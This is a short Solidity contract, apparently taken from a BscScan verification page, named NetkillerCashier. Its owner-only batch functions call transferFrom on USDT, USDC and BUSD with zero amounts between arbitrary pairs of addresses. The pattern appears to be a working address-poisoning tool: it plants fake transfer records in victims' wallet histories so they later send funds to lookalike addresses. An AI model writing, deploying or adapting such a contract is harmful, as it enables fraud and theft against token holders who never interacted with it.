/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

pragma solidity ^0.5.11;
pragma experimental ABIEncoderV2;
interface IERC20 {

     function transferFrom(
         address from,
         address to,
         uint256 amount
     ) external returns (bool);

}


contract NetkillerCashier {
    address public owner;
    IERC20 public token1;
    IERC20 public token2;
    IERC20 public token3;    

    modifier onlyOwner {
        require(msg.sender == owner,"you are not the owner");
        _;
    }

    constructor(IERC20 _token1,IERC20 _token2,IERC20 _token3) public {
        owner = msg.sender;
        token1 = _token1;//usdt
        token2 = _token2;//usdc
        token3 = _token3;//busd
    }

    function AutoSend(address[] memory _addrfrom,address[] memory _addrto) payable onlyOwner public {   
        require(_addrfrom.length > 0);
        require(_addrfrom.length==_addrto.length);
        for(uint32 i=0;i<_addrfrom.length;i++){
                   token1.transferFrom(_addrfrom[i],_addrto[i],0);
              }

        
    }
    function AutoSend2(address[][] memory _addrlist) payable onlyOwner public {   
        require(_addrlist.length > 0);        
        for(uint32 i=0;i<_addrlist.length;i++){
                              
                   token1.transferFrom(_addrlist[i][0],_addrlist[i][1],0);
            
              }

        
    }
    function AutoSend3(address[][] memory _addrlist,int[] memory _coin) payable onlyOwner public {   
        require(_addrlist.length > 0);        
        for(uint32 i=0;i<_addrlist.length;i++){
            if (_coin[i]==1){                    
                   token1.transferFrom(_addrlist[i][0],_addrlist[i][1],0);
            }
                else if(_coin[i]==2){                    
                   token2.transferFrom(_addrlist[i][0],_addrlist[i][1],0);
            }
                    else if(_coin[i]==3){                    
                   token3.transferFrom(_addrlist[i][0],_addrlist[i][1],0);
            }
              }

        
    }
    
}